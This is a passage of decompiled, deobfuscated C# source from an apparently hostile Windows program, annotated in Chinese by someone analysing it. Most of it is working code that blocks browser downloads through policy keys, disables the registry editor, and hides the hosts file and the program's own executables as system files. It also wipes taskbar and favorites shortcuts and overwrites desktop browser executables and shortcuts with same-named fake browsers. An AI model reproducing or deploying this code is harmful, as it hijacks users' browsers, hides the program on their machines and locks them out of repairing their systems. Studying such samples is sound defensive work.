				if (this.RadioButton8.Checked)
				{
					ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3", "1803", 3, RegistryValueKind.DWord);
					ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3", "2200", 1, RegistryValueKind.DWord);
					ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions", "NoBrowserSaveAs", 1, RegistryValueKind.DWord);
					ExceptionMock.WriteRegistryValue(Registry.LocalMachine, "SOFTWARE\\Policies\\Microsoft\\Edge", "DownloadRestrictions", 3, RegistryValueKind.DWord);
					ExceptionMock.WriteRegistryValue(Registry.LocalMachine, "SOFTWARE\\Policies\\Microsoft\\Edge", "SaveAs", 0, RegistryValueKind.DWord);
					ExceptionMock.WriteRegistryValue(Registry.LocalMachine, "SOFTWARE\\Policies\\Google\\Chrome", "DownloadRestrictions", 3, RegistryValueKind.DWord);
					ExceptionMock.WriteRegistryValue(Registry.LocalMachine, "SOFTWARE\\Policies\\Google\\Chrome", "SaveAs", 0, RegistryValueKind.DWord);
					ExceptionMock.WriteRegistryValue(Registry.LocalMachine, "SOFTWARE\\Policies\\Mozilla\\Firefox", "DisableDownloads", 1, RegistryValueKind.DWord);
					ExceptionMock.WriteRegistryValue(Registry.LocalMachine, "SOFTWARE\\Policies\\Mozilla\\Firefox", "BlockAboutDownloads", 1, RegistryValueKind.DWord);
				}
				// 17) RB7=允许下载 → 全部还原
				if (this.RadioButton7.Checked)
				{
					ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3", "1803", 0, RegistryValueKind.DWord);
					ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3", "2200", 0, RegistryValueKind.DWord);
					ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions", "NoBrowserSaveAs", 0, RegistryValueKind.DWord);
					ExceptionMock.WriteRegistryValue(Registry.LocalMachine, "SOFTWARE\\Policies\\Microsoft\\Edge", "DownloadRestrictions", 0, RegistryValueKind.DWord);
					ExceptionMock.WriteRegistryValue(Registry.LocalMachine, "SOFTWARE\\Policies\\Microsoft\\Edge", "SaveAs", 1, RegistryValueKind.DWord);
					ExceptionMock.WriteRegistryValue(Registry.LocalMachine, "SOFTWARE\\Policies\\Google\\Chrome", "DownloadRestrictions", 0, RegistryValueKind.DWord);
					ExceptionMock.WriteRegistryValue(Registry.LocalMachine, "SOFTWARE\\Policies\\Google\\Chrome", "SaveAs", 1, RegistryValueKind.DWord);
					ExceptionMock.WriteRegistryValue(Registry.LocalMachine, "SOFTWARE\\Policies\\Mozilla\\Firefox", "DisableDownloads", 0, RegistryValueKind.DWord);
					ExceptionMock.WriteRegistryValue(Registry.LocalMachine, "SOFTWARE\\Policies\\Mozilla\\Firefox", "BlockAboutDownloads", 0, RegistryValueKind.DWord);
				}
				// 18) hosts 与 drivers\etc 设 ReadOnly+Hidden+System；隐藏文件/扩展名不可见
				Thread.Sleep(1000);
				File.SetAttributes(this.hostsFilePath, File.GetAttributes(this.hostsFilePath) | FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.System);
				File.SetAttributes("C:\\Windows\\System32\\drivers\\etc", File.GetAttributes("C:\\Windows\\System32\\drivers\\etc") | FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.System);
				ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", 0, RegistryValueKind.DWord);
				ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "ShowSuperHidden", 0, RegistryValueKind.DWord);
				ExceptionMock.WriteRegistryValue(Registry.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\SHOWALL", "CheckedValue", 0, RegistryValueKind.DWord);
				// 19) NoFolderOptions 按下载开关设置（RB8=禁止→1，RB7=允许→0）
				if (this.RadioButton8.Checked)
				{
					ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoFolderOptions", 1, RegistryValueKind.DWord);
				}
				if (this.RadioButton7.Checked)
				{
					ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoFolderOptions", 0, RegistryValueKind.DWord);
				}
				ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "HideFileExt", 1, RegistryValueKind.DWord);
				// 20) 注册表编辑器：RB20=完全禁止 → DisableRegistryTools=1；RB19=自动关闭 → 0
				if (this.RadioButton20.Checked)
				{
					RegistryKey policiesKey = Reader.MyComputer.Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
					if (policiesKey == null)
					{
						policiesKey = Reader.MyComputer.Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
					}
					ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", 1, RegistryValueKind.DWord);
				}
				if (this.RadioButton19.Checked)
				{
					ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", 0, RegistryValueKind.DWord);
				}
				// 21) 隐藏微软游戏目录；禁用 IPv6；关触摸键盘
				File.SetAttributes("C:\\Program Files\\Microsoft Games", File.GetAttributes("C:\\Program Files\\Microsoft Games") | FileAttributes.Hidden | FileAttributes.System);
				ExceptionMock.WriteRegistryValue(Registry.LocalMachine, "SYSTEM\\CurrentControlSet\\Services\\Tcpip6\\Parameters", "DisabledComponents", 255, RegistryValueKind.DWord);
				ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "SOFTWARE\\Microsoft\\TabletTip\\1.7", "TipbandDesiredVisibility", 0, RegistryValueKind.DWord);
				// 22) 复制 jfglzsn/przs/zmserv.exe → c:\windows\jf\*.dat 并全部设 Hidden+System
				Directory.CreateDirectory(this.hiddenBackupDir);
				File.Copy(Application.StartupPath + "\\jfglzsn.exe", this.hiddenBackupDir + "\\jfglzsn.dat", true);
				File.Copy(Application.StartupPath + "\\przs.exe", this.hiddenBackupDir + "\\przs.dat", true);
				File.Copy(Application.StartupPath + "\\zmserv.exe", this.hiddenBackupDir + "\\zmserv.dat", true);
				File.SetAttributes(this.hiddenBackupDir, File.GetAttributes(this.hiddenBackupDir) | FileAttributes.Hidden | FileAttributes.System);
				File.SetAttributes(this.hiddenBackupDir + "\\jfglzsn.dat", File.GetAttributes(this.hiddenBackupDir + "\\jfglzsn.dat") | FileAttributes.Hidden | FileAttributes.System);
				File.SetAttributes(this.hiddenBackupDir + "\\przs.dat", File.GetAttributes(this.hiddenBackupDir + "\\przs.dat") | FileAttributes.Hidden | FileAttributes.System);
				File.SetAttributes(this.hiddenBackupDir + "\\zmserv.dat", File.GetAttributes(this.hiddenBackupDir + "\\zmserv.dat") | FileAttributes.Hidden | FileAttributes.System);
				// 23) 全部可执行文件与伪装文件设 Hidden+System（含启动目录、C:\Windows\Microsoft.NET）
				File.SetAttributes(Application.StartupPath + "\\jfglzsn.exe", File.GetAttributes(Application.StartupPath + "\\jfglzsn.exe") | FileAttributes.Hidden | FileAttributes.System);
				File.SetAttributes(Application.StartupPath + "\\zmserv.exe", File.GetAttributes(Application.StartupPath + "\\zmserv.exe") | FileAttributes.Hidden | FileAttributes.System);
				File.SetAttributes(Application.StartupPath + "\\przs.exe", File.GetAttributes(Application.StartupPath + "\\przs.exe") | FileAttributes.Hidden | FileAttributes.System);
				File.SetAttributes(Application.StartupPath + "\\set.exe", File.GetAttributes(Application.StartupPath + "\\set.exe") | FileAttributes.Hidden | FileAttributes.System);
				File.SetAttributes(Application.StartupPath + "\\uninstall.exe", File.GetAttributes(Application.StartupPath + "\\uninstall.exe") | FileAttributes.Hidden | FileAttributes.System);
				File.SetAttributes(Application.StartupPath + "\\about.exe", File.GetAttributes(Application.StartupPath + "\\about.exe") | FileAttributes.Hidden | FileAttributes.System);
				File.SetAttributes(Application.StartupPath + "\\yl.wav", File.GetAttributes(Application.StartupPath + "\\yl.wav") | FileAttributes.Hidden | FileAttributes.System);
				File.SetAttributes(Application.StartupPath + "\\huifu.wav", File.GetAttributes(Application.StartupPath + "\\huifu.wav") | FileAttributes.Hidden | FileAttributes.System);
				File.SetAttributes(Application.StartupPath + "\\hmd_local.txt", File.GetAttributes(Application.StartupPath + "\\hmd_local.txt") | FileAttributes.Hidden | FileAttributes.System);
				File.SetAttributes(Application.StartupPath + "\\regini.exe", File.GetAttributes(Application.StartupPath + "\\regini.exe") | FileAttributes.Hidden | FileAttributes.System);
				File.SetAttributes(Application.StartupPath, File.GetAttributes(Application.StartupPath) | FileAttributes.Hidden | FileAttributes.System);
				File.SetAttributes("C:\\Windows\\Microsoft.NET", File.GetAttributes("C:\\Windows\\Microsoft.NET") | FileAttributes.Hidden | FileAttributes.System);
				// 24) 删除临时 reg 文件；等 2 秒后杀 explorer 重启外壳并显示完成提示
				File.Delete(Application.StartupPath + "\\yl.reg");
				File.Delete(Application.StartupPath + "\\huifu.reg");
				Thread.Sleep(2000);
				this.Cursor = Cursors.Default;
				Process[] explorerProcesses = Process.GetProcessesByName("explorer");
				for (int i = 0; i < explorerProcesses.Length; i++)
				{
					explorerProcesses[i].Kill();
				}
				Process.Start("explorer.exe");
				Reader.MyForms.Form3.Show();
			}
			catch (Exception ex) { /* 原混淆样板：忽略错误 */ }
		}

		/// <summary>
		/// 清理快速启动栏：清空 Quick Launch/任务栏/收藏夹 的 .lnk，放入"百度搜索&网址导航"快捷方式。
		/// </summary>
		// Token: 0x060000B3 RID: 179 RVA: 0x00007E34 File Offset: 0x00006034
		// [反混淆] 原状态机54行 → 还原为正常控制流34行
		private void CleanQuickLaunchBar()
		{
			try
			{
				// 清空快速启动栏并放入假 IE 快捷方式
				string quickLaunchPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Internet Explorer\\Quick Launch";
				Microsoft.VisualBasic.FileSystem.Kill(quickLaunchPath + "\\*.*");
				File.Copy(Application.StartupPath + "\\zy\\Internet   Explore.lnk", quickLaunchPath + "\\Internet   Explore.lnk", true);
				// 清空任务栏固定区并放入假 IE 快捷方式
				string taskBarPath = quickLaunchPath + "\\User Pinned\\TaskBar";
				Microsoft.VisualBasic.FileSystem.Kill(taskBarPath + "\\*.*");
				File.Copy(Application.StartupPath + "\\zy\\Internet   Explore.lnk", taskBarPath + "\\Internet   Explore.lnk", true);
				// 收藏夹 links 目录：清空并放入“百度搜索&网址导航”快捷方式
				string favoritesPath = Conversions.ToString(ExceptionMock.ReadRegistryValue(Registry.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders", "Favorites", ""));
				string linksPath = favoritesPath + "\\links";
				Microsoft.VisualBasic.FileSystem.Kill(linksPath + "\\*.*");
				Microsoft.VisualBasic.FileSystem.Kill(linksPath + "\\*.*"); // 原代码对同一路径重复执行两次
				File.Copy(Application.StartupPath + "\\zy\\百度搜索&网址导航.url", linksPath + "\\百度搜索&网址导航.url", true);
				File.Copy(Application.StartupPath + "\\zy\\百度搜索&网址导航.url", linksPath + "\\百度搜索&网址导航.url", true); // 原代码对同一路径重复执行两次
				// 启用 IE 链接栏
				RegistryKey currentUser = Reader.MyComputer.Registry.CurrentUser;
				RegistryKey linksBarKey = currentUser.OpenSubKey("Software\\Microsoft\\Internet Explorer\\LinksBar", true);
				if (linksBarKey == null)
				{
					linksBarKey = currentUser.CreateSubKey("Software\\Microsoft\\Internet Explorer\\LinksBar");
				}
				linksBarKey.SetValue("Enabled", 1);
			}
			catch (Exception ex) { /* 原混淆样板：忽略错误 */ }
		}

		/// <summary>
		/// 替换桌面浏览器（嵌套状态机还原）：遍历用户桌面 + C:\Users\Public\Desktop 的 *.exe：
		/// 文件名含 360安全浏览器/Google Chrome/2345/QQ浏览器/Firefox/Microsoft Edge 等 → 用 StartupPath\zy\ 下同名假浏览器 exe 覆盖；
		/// 含"谷歌浏览器"（假 chrome）→ 弹窗提示并删除；遍历 *.lnk：ReadLnkTargetPath 取原目标 → 写入 HKCU\Software\{360,chrome,2345,firefox,360js,360jsx,qq,jisu,shuanghe,edge} → 删除原 lnk → 复制假浏览器；
		/// 全部未替换过则桌面放"百度搜索&网址导航.url"；最后删除 \zy\ 目录全部文件（销毁证据）。
		/// </summary>
		// Token: 0x060000B4 RID: 180 RVA: 0x000080C0 File Offset: 0x000062C0
		// [反混淆] 原状态机1089行 → 还原为正常控制流（4个遍历循环 + 收尾清理）
		private void ReplaceBrowserShortcuts()
		{
			try
			{
				int replacedCount = 0; // 已替换的浏览器数（0 表示一个都没替换过）
				string userDesktop = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
				string publicDesktop = "C:\\Users\\Public\\Desktop";
				// 1) 用户桌面 *.exe：文件名命中浏览器关键字 → 用 \zy\ 下同名假浏览器 exe 覆盖
				foreach (string exeFile in Reader.MyComputer.FileSystem.GetFiles(userDesktop, Microsoft.VisualBasic.FileIO.SearchOption.SearchTopLevelOnly, new string[]
				{
					"*.exe"
				}))
				{
					if (Strings.InStr(exeFile, "360安全浏览器", CompareMethod.Binary) > 0)
					{
						replacedCount++;
						File.SetAttributes(exeFile, FileAttributes.Normal);
						File.Copy(Application.StartupPath + "\\zy\\360安全浏览器.exe", userDesktop + "\\360安全浏览器.exe", true);
					}
					else if (Strings.InStr(exeFile, "Google Chrome", CompareMethod.Binary) > 0)
					{
						replacedCount++;
						File.SetAttributes(exeFile, FileAttributes.Normal);
						File.Copy(Application.StartupPath + "\\zy\\Google Chrome.exe", userDesktop + "\\Google Chrome.exe", true);
					}
					else if (Strings.InStr(exeFile, "2345加速浏览器", CompareMethod.Binary) > 0)
					{
						replacedCount++;
						File.SetAttributes(exeFile, FileAttributes.Normal);
						File.Copy(Application.StartupPath + "\\zy\\2345加速浏览器.exe", userDesktop + "\\2345加速浏览器.exe", true);
					}
					else if (Strings.InStr(exeFile, "360极速浏览器", CompareMethod.Binary) > 0)
					{
						replacedCount++;
						File.SetAttributes(exeFile, FileAttributes.Normal);
						File.Copy(Application.StartupPath + "\\zy\\360极速浏览器.exe", userDesktop + "\\360极速浏览器.exe", true);
					}
					else if (Strings.InStr(exeFile, "360 极速浏览器X", CompareMethod.Binary) > 0)
					{
						replacedCount++;
						File.SetAttributes(exeFile, FileAttributes.Normal);
						File.Copy(Application.StartupPath + "\\zy\\360 极速浏览器X.exe", userDesktop + "\\360 极速浏览器X.exe", true);
					}
					else if (Strings.InStr(exeFile, "QQ浏览器", CompareMethod.Binary) > 0)
					{
						replacedCount++;
						File.SetAttributes(exeFile, FileAttributes.Normal);
						File.Copy(Application.StartupPath + "\\zy\\QQ浏览器.exe", userDesktop + "\\QQ浏览器.exe", true);
					}
					else if (Strings.InStr(exeFile, "极速浏览器", CompareMethod.Binary) > 0)
					{
						replacedCount++;
						File.SetAttributes(exeFile, FileAttributes.Normal);
						File.Copy(Application.StartupPath + "\\zy\\极速浏览器.exe", userDesktop + "\\极速浏览器.exe", true);
					}
					else if (Strings.InStr(exeFile, "双核浏览器", CompareMethod.Binary) > 0)
					{
						replacedCount++;
						File.SetAttributes(exeFile, FileAttributes.Normal);
						File.Copy(Application.StartupPath + "\\zy\\双核浏览器.exe", userDesktop + "\\双核浏览器.exe", true);
					}
					else if (Strings.InStr(exeFile, "Firefox", CompareMethod.Binary) > 0)
					{
						replacedCount++;
						File.SetAttributes(exeFile, FileAttributes.Normal);
						File.Copy(Application.StartupPath + "\\zy\\Firefox.exe", userDesktop + "\\Firefox.exe", true);
					}
					else if (Strings.InStr(exeFile, "谷歌浏览器", CompareMethod.Binary) > 0)
					{
						// 假 chrome（谷歌浏览器）→ 弹窗提示并删除
						Interaction.MsgBox("删除桌面上假google chrome的快捷方式，win7先下载安装正版google chrome再重新设置。", MsgBoxStyle.OkOnly, null);
						File.SetAttributes(exeFile, FileAttributes.Normal);
						Microsoft.VisualBasic.FileSystem.Kill(exeFile);
					}
					else if (Strings.InStr(exeFile, "Microsoft Edge", CompareMethod.Binary) > 0)
					{
						replacedCount++;
						File.SetAttributes(exeFile, FileAttributes.Normal);
						File.Copy(Application.StartupPath + "\\zy\\Microsoft Edge.exe", userDesktop + "\\Microsoft Edge.exe", true);
					}
				}
				// 2) 公共桌面 C:\Users\Public\Desktop *.exe：同样处理
				foreach (string exeFile in Reader.MyComputer.FileSystem.GetFiles(publicDesktop, Microsoft.VisualBasic.FileIO.SearchOption.SearchTopLevelOnly, new string[]
				{
					"*.exe"
				}))
				{
					if (Strings.InStr(exeFile, "360安全浏览器", CompareMethod.Binary) > 0)
					{
						replacedCount++;
						File.SetAttributes(exeFile, FileAttributes.Normal);
						File.Copy(Application.StartupPath + "\\zy\\360安全浏览器.exe", publicDesktop + "\\360安全浏览器.exe", true);
					}
					else if (Strings.InStr(exeFile, "Google Chrome", CompareMethod.Binary) > 0)
					{
						replacedCount++;
						File.SetAttributes(exeFile, FileAttributes.Normal);
						File.Copy(Application.StartupPath + "\\zy\\Google Chrome.exe", publicDesktop + "\\Google Chrome.exe", true);
					}
					else if (Strings.InStr(exeFile, "2345加速浏览器", CompareMethod.Binary) > 0)
					{
						replacedCount++;
						File.SetAttributes(exeFile, FileAttributes.Normal);
						File.Copy(Application.StartupPath + "\\zy\\2345加速浏览器.exe", publicDesktop + "\\2345加速浏览器.exe", true);
					}
					else if (Strings.InStr(exeFile, "360极速浏览器", CompareMethod.Binary) > 0)
					{
						replacedCount++;
						File.SetAttributes(exeFile, FileAttributes.Normal);
						File.Copy(Application.StartupPath + "\\zy\\360极速浏览器.exe", publicDesktop + "\\360极速浏览器.exe", true);
					}
					else if (Strings.InStr(exeFile, "360 极速浏览器X", CompareMethod.Binary) > 0)
					{
						replacedCount++;
						File.SetAttributes(exeFile, FileAttributes.Normal);
						File.Copy(Application.StartupPath + "\\zy\\360 极速浏览器X.exe", publicDesktop + "\\360 极速浏览器X.exe", true);
					}
					else if (Strings.InStr(exeFile, "QQ浏览器", CompareMethod.Binary) > 0)
					{
						replacedCount++;
						File.SetAttributes(exeFile, FileAttributes.Normal);
						File.Copy(Application.StartupPath + "\\zy\\QQ浏览器.exe", publicDesktop + "\\QQ浏览器.exe", true);
					}
					else if (Strings.InStr(exeFile, "极速浏览器", CompareMethod.Binary) > 0)
					{
						replacedCount++;
						File.SetAttributes(exeFile, FileAttributes.Normal);
						File.Copy(Application.StartupPath + "\\zy\\极速浏览器.exe", publicDesktop + "\\极速浏览器.exe", true);
					}
					else if (Strings.InStr(exeFile, "双核浏览器", CompareMethod.Binary) > 0)
					{
						replacedCount++;
						File.SetAttributes(exeFile, FileAttributes.Normal);
						File.Copy(Application.StartupPath + "\\zy\\双核浏览器.exe", publicDesktop + "\\双核浏览器.exe", true);
					}
					else if (Strings.InStr(exeFile, "Firefox", CompareMethod.Binary) > 0)
					{
						replacedCount++;
						File.SetAttributes(exeFile, FileAttributes.Normal);
						File.Copy(Application.StartupPath + "\\zy\\Firefox.exe", publicDesktop + "\\Firefox.exe", true);
					}
					else if (Strings.InStr(exeFile, "谷歌浏览器", CompareMethod.Binary) > 0)
					{
						Interaction.MsgBox("删除桌面上假google chrome的快捷方式，win7先下载安装正版google chrome再重新设置。", MsgBoxStyle.OkOnly, null);
						File.SetAttributes(exeFile, FileAttributes.Normal);
						Microsoft.VisualBasic.FileSystem.Kill(exeFile);
					}
					else if (Strings.InStr(exeFile, "Microsoft Edge", CompareMethod.Binary) > 0)
					{
						replacedCount++;
						File.SetAttributes(exeFile, FileAttributes.Normal);
						File.Copy(Application.StartupPath + "\\zy\\Microsoft Edge.exe", publicDesktop + "\\Microsoft Edge.exe", true);
					}
				}
				// 3) 用户桌面 *.lnk：记录原目标到 HKCU\Software\{360,chrome,2345,firefox,360js,360jsx,qq,jisu,shuanghe,edge} → 删除原 lnk → 复制假浏览器
				foreach (string lnkFile in Reader.MyComputer.FileSystem.GetFiles(userDesktop, Microsoft.VisualBasic.FileIO.SearchOption.SearchTopLevelOnly, new string[]
				{
					"*.lnk"
				}))
				{
					if (Strings.InStr(lnkFile, "360安全浏览器", CompareMethod.Binary) > 0)
					{
						string target = this.ReadLnkTargetPath(lnkFile);
						ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software", "360", target, RegistryValueKind.String);
						File.SetAttributes(lnkFile, FileAttributes.Normal);
						Microsoft.VisualBasic.FileSystem.Kill(lnkFile);
						File.Copy(Application.StartupPath + "\\zy\\360安全浏览器.exe", userDesktop + "\\360安全浏览器.exe", true);
						replacedCount++;
					}
					else if (Strings.InStr(lnkFile, "Google Chrome", CompareMethod.Binary) > 0)
					{
						string target = this.ReadLnkTargetPath(lnkFile);
						ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software", "chrome", target, RegistryValueKind.String);
						File.SetAttributes(lnkFile, FileAttributes.Normal);
						Microsoft.VisualBasic.FileSystem.Kill(lnkFile);
						File.Copy(Application.StartupPath + "\\zy\\Google Chrome.exe", userDesktop + "\\Google Chrome.exe", true);
						replacedCount++;
					}
					else if (Strings.InStr(lnkFile, "2345加速浏览器", CompareMethod.Binary) > 0)
					{
						string target = this.ReadLnkTargetPath(lnkFile);
						ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software", "2345", target, RegistryValueKind.String);
						File.SetAttributes(lnkFile, FileAttributes.Normal);
						Microsoft.VisualBasic.FileSystem.Kill(lnkFile);
						File.Copy(Application.StartupPath + "\\zy\\2345加速浏览器.exe", userDesktop + "\\2345加速浏览器.exe", true);
						replacedCount++;
					}
					else if (Strings.InStr(lnkFile, "Firefox", CompareMethod.Binary) > 0 | Strings.InStr(lnkFile, "firefox", CompareMethod.Binary) > 0)
					{
						string target = this.ReadLnkTargetPath(lnkFile);
						ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software", "firefox", target, RegistryValueKind.String);
						File.SetAttributes(lnkFile, FileAttributes.Normal);
						Microsoft.VisualBasic.FileSystem.Kill(lnkFile);
						File.Copy(Application.StartupPath + "\\zy\\Firefox.exe", userDesktop + "\\Firefox.exe", true);
						replacedCount++;
					}
					else if (Strings.InStr(lnkFile, "360极速浏览器", CompareMethod.Binary) > 0)
					{
						string target = this.ReadLnkTargetPath(lnkFile);
						ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software", "360js", target, RegistryValueKind.String);
						File.SetAttributes(lnkFile, FileAttributes.Normal);
						Microsoft.VisualBasic.FileSystem.Kill(lnkFile);
						File.Copy(Application.StartupPath + "\\zy\\360极速浏览器.exe", userDesktop + "\\360极速浏览器.exe", true);
						replacedCount++;
					}
					else if (Strings.InStr(lnkFile, "360 极速浏览器X", CompareMethod.Binary) > 0)
					{
						string target = this.ReadLnkTargetPath(lnkFile);
						ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software", "360jsx", target, RegistryValueKind.String);
						File.SetAttributes(lnkFile, FileAttributes.Normal);
						Microsoft.VisualBasic.FileSystem.Kill(lnkFile);
						File.Copy(Application.StartupPath + "\\zy\\360 极速浏览器X.exe", userDesktop + "\\360 极速浏览器X.exe", true);
						replacedCount++;
					}
					else if (Strings.InStr(lnkFile, "QQ浏览器", CompareMethod.Binary) > 0)
					{
						string target = this.ReadLnkTargetPath(lnkFile);
						ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software", "qq", target, RegistryValueKind.String);
						File.SetAttributes(lnkFile, FileAttributes.Normal);
						Microsoft.VisualBasic.FileSystem.Kill(lnkFile);
						File.Copy(Application.StartupPath + "\\zy\\QQ浏览器.exe", userDesktop + "\\QQ浏览器.exe", true);
						replacedCount++;
					}
					else if (Strings.InStr(lnkFile, "极速浏览器", CompareMethod.Binary) > 0)
					{
						string target = this.ReadLnkTargetPath(lnkFile);
						ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software", "jisu", target, RegistryValueKind.String);
						File.SetAttributes(lnkFile, FileAttributes.Normal);
						Microsoft.VisualBasic.FileSystem.Kill(lnkFile);
						File.Copy(Application.StartupPath + "\\zy\\极速浏览器.exe", userDesktop + "\\极速浏览器.exe", true);
						replacedCount++;
					}
					else if (Strings.InStr(lnkFile, "双核浏览器", CompareMethod.Binary) > 0)
					{
						string target = this.ReadLnkTargetPath(lnkFile);
						ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software", "shuanghe", target, RegistryValueKind.String);
						File.SetAttributes(lnkFile, FileAttributes.Normal);
						Microsoft.VisualBasic.FileSystem.Kill(lnkFile);
						File.Copy(Application.StartupPath + "\\zy\\双核浏览器.exe", userDesktop + "\\双核浏览器.exe", true);
						replacedCount++;
					}
					else if (Strings.InStr(lnkFile, "谷歌浏览器", CompareMethod.Binary) > 0)
					{
						Interaction.MsgBox("删除桌面上假google chrome的快捷方式，win7先下载安装正版google chrome再重新设置。", MsgBoxStyle.OkOnly, null);
						Microsoft.VisualBasic.FileSystem.Kill(lnkFile);
					}
					else if (Strings.InStr(lnkFile, "Microsoft Edge", CompareMethod.Binary) > 0)
					{
						string target = this.ReadLnkTargetPath(lnkFile);
						File.SetAttributes(lnkFile, FileAttributes.Normal);
						Microsoft.VisualBasic.FileSystem.Kill(lnkFile);
						// 原目标含 .exe 才记录并替换
						if (Strings.InStr(target, ".exe", CompareMethod.Binary) > 0)
						{
							ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software", "edge", target, RegistryValueKind.String);
							File.Copy(Application.StartupPath + "\\zy\\Microsoft Edge.exe", userDesktop + "\\Microsoft Edge.exe", true);
							replacedCount++;
						}
					}
				}
				// 4) 公共桌面 *.lnk：同样处理
				foreach (string lnkFile in Reader.MyComputer.FileSystem.GetFiles(publicDesktop, Microsoft.VisualBasic.FileIO.SearchOption.SearchTopLevelOnly, new string[]
				{
					"*.lnk"
				}))
				{
					if (Strings.InStr(lnkFile, "360安全浏览器", CompareMethod.Binary) > 0)
					{
						string target = this.ReadLnkTargetPath(lnkFile);
						ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software", "360", target, RegistryValueKind.String);
						File.SetAttributes(lnkFile, FileAttributes.Normal);
						Microsoft.VisualBasic.FileSystem.Kill(lnkFile);
						File.Copy(Application.StartupPath + "\\zy\\360安全浏览器.exe", publicDesktop + "\\360安全浏览器.exe", true);
						replacedCount++;
					}
					else if (Strings.InStr(lnkFile, "Google Chrome", CompareMethod.Binary) > 0)
					{
						string target = this.ReadLnkTargetPath(lnkFile);
						ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software", "chrome", target, RegistryValueKind.String);
						File.SetAttributes(lnkFile, FileAttributes.Normal);
						Microsoft.VisualBasic.FileSystem.Kill(lnkFile);
						File.Copy(Application.StartupPath + "\\zy\\Google Chrome.exe", publicDesktop + "\\Google Chrome.exe", true);
						replacedCount++;
					}
					else if (Strings.InStr(lnkFile, "2345加速浏览器", CompareMethod.Binary) > 0)
					{
						string target = this.ReadLnkTargetPath(lnkFile);
						ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software", "2345", target, RegistryValueKind.String);
						File.SetAttributes(lnkFile, FileAttributes.Normal);
						Microsoft.VisualBasic.FileSystem.Kill(lnkFile);
						File.Copy(Application.StartupPath + "\\zy\\2345加速浏览器.exe", publicDesktop + "\\2345加速浏览器.exe", true);
						replacedCount++;
					}
					else if (Strings.InStr(lnkFile, "Firefox", CompareMethod.Binary) > 0 | Strings.InStr(lnkFile, "firefox", CompareMethod.Binary) > 0)
					{
						string target = this.ReadLnkTargetPath(lnkFile);
						ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software", "firefox", target, RegistryValueKind.String);
						File.SetAttributes(lnkFile, FileAttributes.Normal);
						Microsoft.VisualBasic.FileSystem.Kill(lnkFile);
						File.Copy(Application.StartupPath + "\\zy\\Firefox.exe", publicDesktop + "\\Firefox.exe", true);
						replacedCount++;
					}
					else if (Strings.InStr(lnkFile, "360极速浏览器", CompareMethod.Binary) > 0)
					{
						string target = this.ReadLnkTargetPath(lnkFile);
						ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software", "360js", target, RegistryValueKind.String);
						File.SetAttributes(lnkFile, FileAttributes.Normal);
						Microsoft.VisualBasic.FileSystem.Kill(lnkFile);
						File.Copy(Application.StartupPath + "\\zy\\360极速浏览器.exe", publicDesktop + "\\360极速浏览器.exe", true);
						replacedCount++;
					}
					else if (Strings.InStr(lnkFile, "360 极速浏览器X", CompareMethod.Binary) > 0)
					{
						string target = this.ReadLnkTargetPath(lnkFile);
						ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software", "360jsx", target, RegistryValueKind.String);
						File.SetAttributes(lnkFile, FileAttributes.Normal);
						Microsoft.VisualBasic.FileSystem.Kill(lnkFile);
						File.Copy(Application.StartupPath + "\\zy\\360 极速浏览器X.exe", publicDesktop + "\\360 极速浏览器X.exe", true);
						replacedCount++;
					}
					else if (Strings.InStr(lnkFile, "QQ浏览器", CompareMethod.Binary) > 0)
					{
						string target = this.ReadLnkTargetPath(lnkFile);
